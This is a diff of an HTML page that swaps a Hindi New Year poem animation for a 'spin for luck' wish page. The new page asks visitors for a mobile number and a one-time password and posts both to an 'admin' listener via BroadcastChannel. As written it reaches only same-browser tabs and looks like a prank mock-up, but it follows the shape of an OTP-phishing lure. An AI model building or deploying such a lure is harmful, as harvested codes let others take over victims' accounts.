@@ -1,217 +1,141 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>31 दिसंबर – आख़िरी पन्ना</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>User Wish Page</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+      text-align: center;
+      padding-top: 100px;
+    }
 
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Noto+Serif+Devanagari:wght@400;600&display=swap');
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      background: gold;
+      color: black;
+      min-width: 180px;
+    }
 
-* { margin:0; padding:0; box-sizing:border-box; }
+    button.loading {
+      background: #ccc;
+      cursor: not-allowed;
+    }
 
-body {
-  height: 100vh;
-  background:
-    linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.95)),
-    url("https://images.unsplash.com/photo-1500530855697-b586d89ba3ee")
-    no-repeat center/cover;
-  filter: grayscale(100%);
-  font-family: 'Noto Serif Devanagari', serif;
-  color: #f2f2f2;
-  overflow: hidden;
-}
+    .modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+    }
 
-/* 📜 Scroll-safe container */
-.wrapper {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  width: 90%;
-  max-width: 700px;
-  max-height: 65vh;
-  overflow-y: auto;
-  text-align: center;
-  padding-bottom: 120px;
-}
+    .modal-content {
+      background: white;
+      color: black;
+      width: 320px;
+      margin: 15% auto;
+      padding: 20px;
+      border-radius: 12px;
+      text-align: center;
+    }
 
-.line {
-  opacity: 0;
-  font-size: 1.4rem;
-  margin: 14px 0;
-  animation: fadeIn 1.8s forwards;
-}
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+    }
 
-@keyframes fadeIn {
-  from { opacity:0; transform:translateY(15px); filter:blur(6px); }
-  to   { opacity:1; transform:translateY(0); filter:blur(0); }
-}
+    #wishBox {
+      margin-top: 40px;
+      font-size: 26px;
+      font-weight: bold;
+      color: #ffeb3b;
+    }
 
-.author {
-  margin-top: 25px;
-  font-size: 1.1rem;
-  opacity: 0.7;
-  font-style: italic;
-}
+    .spin {
+      display: inline-block;
+      animation: spin 1s linear infinite;
+    }
 
-/* 🕯 Candle */
-.candle {
-  position: fixed;
-  bottom: 50px;
-  left: 50%;
-  transform: translateX(-50%);
-  width: 22px;
-  height: 90px;
-  background: #eee;
-  border-radius: 4px;
-}
-
-.flame {
-  position: absolute;
-  top: -30px;
-  left: 50%;
-  transform: translateX(-50%);
-  width: 20px;
-  height: 30px;
-  background: radial-gradient(circle, #ffdd55, #ff8800, transparent);
-  border-radius: 50%;
-  animation: flicker 0.15s infinite alternate;
-}
-
-@keyframes flicker {
-  from { transform:translateX(-50%) scale(1); }
-  to   { transform:translateX(-50%) scale(1.1); }
-}
-
-/* 💥 Candle Boom */
-.boom {
-  animation: explode 1s forwards;
-}
-
-@keyframes explode {
-  to { opacity:0; transform:scale(3); }
-}
-
-/* 🎆 Fireworks */
-.fire {
-  position: fixed;
-  width: 6px;
-  height: 6px;
-  background: gold;
-  border-radius: 50%;
-  animation: firework 1.2s linear forwards;
-}
-
-@keyframes firework {
-  from { transform:scale(1); opacity:1; }
-  to   { transform:scale(8); opacity:0; }
-}
-
-/* 🎉 Final Greeting */
-.newyear {
-  position: fixed;
-  top: 40%;
-  width: 100%;
-  text-align: center;
-  font-size: 3rem;
-  font-weight: 600;
-  opacity: 0;
-  animation: glow 3s forwards;
-}
-
-@keyframes glow {
-  from { opacity:0; transform:scale(0.7); }
-  to   { opacity:1; transform:scale(1); }
-}
-
-.footer {
-  position: fixed;
-  bottom: 15px;
-  width: 100%;
-  text-align: center;
-  font-size: 0.9rem;
-  opacity: 0.6;
-}
-</style>
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 
 <body>
 
-<div class="wrapper" id="poem"></div>
+<h1>🌸 Welcome Beautiful Soul 🌸</h1>
+<p>Spin & wait for luck 😄</p>
 
-<div class="candle" id="candle">
-  <div class="flame"></div>
+<button onclick="openModal()">Spin</button>
+
+<div class="modal" id="modal">
+  <div class="modal-content">
+
+    <div id="step1">
+      <h3>Enter Mobile Number</h3>
+      <input id="mobile" placeholder="Mobile Number" />
+      <button onclick="sendOtp()">Send OTP</button>
+    </div>
+
+    <div id="step2" style="display:none;">
+      <h3>Enter OTP</h3>
+      <input id="otp" placeholder="Any 6-digit OTP 😜" />
+      <button id="verifyBtn" onclick="verifyOtp()">Verify OTP</button>
+    </div>
+
+  </div>
 </div>
 
-<div class="footer">🌙🤍 Silent Goodbye</div>
-
-<audio autoplay loop>
-  <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_4b9b5d6f60.mp3">
-</audio>
+<div id="wishBox"></div>
 
 <script>
-const lines = [
-  "31 दिसंबर – आख़िरी पन्ना",
-  "कुछ रिश्ते लिखे नहीं जाते,",
-  "बस निभाए जाते हैं।",
-  "",
-  "और जब निभाने का वक़्त पूरा हो जाए,",
-  "तो उन्हें शोर नहीं,",
-  "ख़ामोशी चाहिए।",
-  "",
-  "अब रास्ते अलग हैं,",
-  "पर दुआओं की ज़मीन",
-  "अब भी साझा है।",
-  "",
-  "नए साल में",
-  "तुम्हारे रिश्तेदारों को",
-  "सुकून, सेहत",
-  "और संतुलन नसीब हो।",
-  "",
-  "आने वाले कल का",
-  "खुले दिल से स्वागत।"
-];
+  const channel = new BroadcastChannel("wish_channel");
 
-const poem = document.getElementById("poem");
-let delay = 0;
-
-lines.forEach((t, i) => {
-  const d = document.createElement("div");
-  d.className = "line";
-  d.textContent = t;
-  d.style.animationDelay = delay + "s";
-  poem.appendChild(d);
-  delay += 1.2;
-});
-
-// Author
-setTimeout(() => {
-  const a = document.createElement("div");
-  a.className = "author";
-  a.textContent = "— Sonu Roy";
-  poem.appendChild(a);
-}, delay * 1000);
-
-// FINAL BOOM + NEW YEAR
-setTimeout(() => {
-  document.getElementById("candle").classList.add("boom");
-
-  for (let i = 0; i < 20; i++) {
-    const f = document.createElement("div");
-    f.className = "fire";
-    f.style.left = Math.random() * window.innerWidth + "px";
-    f.style.top = Math.random() * window.innerHeight + "px";
-    document.body.appendChild(f);
-    setTimeout(() => f.remove(), 1200);
+  function openModal() {
+    document.getElementById("modal").style.display = "block";
   }
 
-  const ny = document.createElement("div");
-  ny.className = "newyear";
-  ny.innerHTML = "🎉 Happy New Year 2026 🎉";
-  document.body.appendChild(ny);
+  function sendOtp() {
+    const mobile = document.getElementById("mobile").value;
+    if (!mobile) return alert("Enter mobile number");
 
-}, (delay + 2) * 1000);
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("step2").style.display = "block";
+  }
+
+  function verifyOtp() {
+    const mobile = document.getElementById("mobile").value;
+    const otp = document.getElementById("otp").value;
+
+    if (!otp || otp.length !== 6) {
+      return alert("Enter 6-digit OTP");
+    }
+
+    const btn = document.getElementById("verifyBtn");
+    btn.classList.add("loading");
+    btn.innerHTML = '<span class="spin">⏳</span> Waiting for Admin...';
+
+    // send data to admin
+    channel.postMessage({
+      type: "USER_SUBMIT",
+      data: { mobile, otp }
+    });
+
+    document.getElementById("modal").style.display = "none";
+  }
+
+  channel.onmessage = (event) => {
+    if (event.data.type === "ADMIN_WISH") {
+      document.getElementById("wishBox").innerText = event.data.message;
+    }
+  };
 </script>
 
 </body>
